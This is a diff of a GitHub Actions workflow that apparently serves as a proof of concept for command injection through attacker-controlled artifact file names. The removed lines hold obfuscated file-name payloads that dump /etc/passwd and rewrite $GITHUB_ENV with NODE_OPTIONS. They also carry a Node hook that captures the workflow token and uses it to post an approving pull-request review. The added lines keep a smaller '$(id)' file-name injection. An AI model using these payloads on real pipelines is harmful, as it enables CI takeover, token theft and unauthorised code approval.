@@ -1,4 +1,4 @@
-name: Test
+name: Tests
 
 on:
   pull_request:
@@ -9,55 +9,16 @@ permissions:
 jobs:
   upload:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      actions: write
     steps:
-      - name: build artifact with attacker-controlled names
+      - name: build artifact with attacker-controlled file names
         run: |
           set -e
-          python3 - <<'PY'
-          import os
-          os.makedirs("content", exist_ok=True)
-          open("content/report.txt", "w").write("plain report\n")
-          open("content/pwn.txt", "w").write("sibling content\n")
-          open("content/p2wn.txt", "w").write("substituted target\n")
-          open("content/pr_number.txt", "w").write(os.environ.get("PR_NUMBER", ""))
-
-          # payload 1: arbitrary command execution (/etc/passwd dumped to stderr) inside the privileged job
-          name1 = ("p$(python3 -c 'import os;os.write(2,open(chr(47)+chr(101)+chr(116)"
-                   "+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100))"
-                   ".read().encode())'; echo 2)wn.txt")
-          open("content/" + name1, "w").write("payload\n")
-
-          # payload 2: overwrite $GITHUB_ENV with NODE_OPTIONS so the later node actions load hook.js
-          name2 = ("q$(perl -e 'sysopen(F,$ENV{GITHUB_ENV},577);print F q{NODE_OPTIONS=--require }.chr(47).q{tmp}.chr(47).q{content}.chr(47).q{content}.chr(47).q{hook.js}.chr(10)'; echo 2)wn.txt")
-          open("content/" + name2, "w").write("payload2\n")
-          open("content/envline.txt", "w").write("NODE_OPTIONS=--require /tmp/content/content/hook.js\n")
-
-          hook = r'''
-          const fs = require('fs');
-          (async () => {
-            try {
-              const t = process.env.INPUT_TOKEN || '';
-              if (!t) return;
-              if (fs.existsSync('/tmp/hook_done')) return;
-              fs.writeFileSync('/tmp/hook_done', '1');
-              const H = { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' };
-              const r = await fetch('https://api.github.com/repos/PDFtoMark/gab-poc-aave-comment/pulls/5/reviews', {
-                method: 'POST', headers: H,
-                body: JSON.stringify({ event: 'APPROVE', body: 'NODE_OPTIONS hook loaded inside workflow action. Token captured from step env; length=' + t.length })
-              });
-              console.log('HOOK APPROVAL STATUS ' + r.status + ' ' + (await r.text()));
-            } catch (e) { console.log('HOOK ERR ' + e.message); }
-          })();
-          '''
-          open("content/hook.js", "w").write(hook)
-          print(sorted(os.listdir("content")))
-          PY
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
+          mkdir -p out
+          printf '%s\n' "${{ github.event.pull_request.number }}" > out/pr_number.txt
+          echo "benign report" > out/report.txt
+          echo payload > 'out/$(id).txt'
+          ls -la out
       - uses: actions/upload-artifact@v4
         with:
           name: content
-          path: content/
+          path: out
